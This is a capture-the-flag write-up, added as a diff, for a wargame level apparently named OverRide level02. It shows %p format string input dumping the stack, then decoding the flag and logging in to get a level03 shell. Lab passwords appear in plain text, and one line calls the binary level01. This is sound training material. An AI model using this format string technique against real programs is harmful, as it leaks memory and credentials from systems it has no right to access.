@@ -1,0 +1,52 @@
+Authenticating as level02/PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+We come across a suid binary named level01.
+
+The program seems to be asking for a username and password. After analysing the binary I found that it does call fopen and fread to reads
+the flag for the next level and store in a variable that is compared later on with the password. And if the comparison is not true then
+it prints the username + "does not have access!"
+
+The thing here is the binary calls printf with username as parameter and no protection, It's format strings vulnerability.
+
+What we need to do is to dump the stack and read the flag that was stored there then get access to the next level.
+
+
+the way to do that is to feed %p to the program into the username input, then we will get stack dump
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+--[ Password: AAA1BBB2CCC3
+*****************************************
+0x7fffffffe450 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe648 0x1f7ff9a08
+0x3242424231414141 0x33434343 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil)
+0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil)
+0x7025207025207025 0x2520702520702520 0x2070252070252070 does not have access!
+
+As you can see here there's a size 0x41 which used to read the flag with fread(). 0x2a2a2a2a2a2a2a2a represent the '*' in the stack
+0x3242424231414141 0x33434343 represent our password (AAA1BBB2CCC3) and if we decode it to ascii it will look like this (2BBB1AAA3CCC) it's in
+little endian and this will gives us an idea on how to decode the flag.
+
+So the next hex values represent our flag in the stack. What we need to do is to format it to big endian and decode it to ascii.
+and we will get Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H.
+
+
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: admin
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+*****************************************
+Greetings, admin!
+$ whoami
+level03
+$ cd /home/users/level03
+$ cat .pass
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+$
+
+And Here it is, the password for level03.
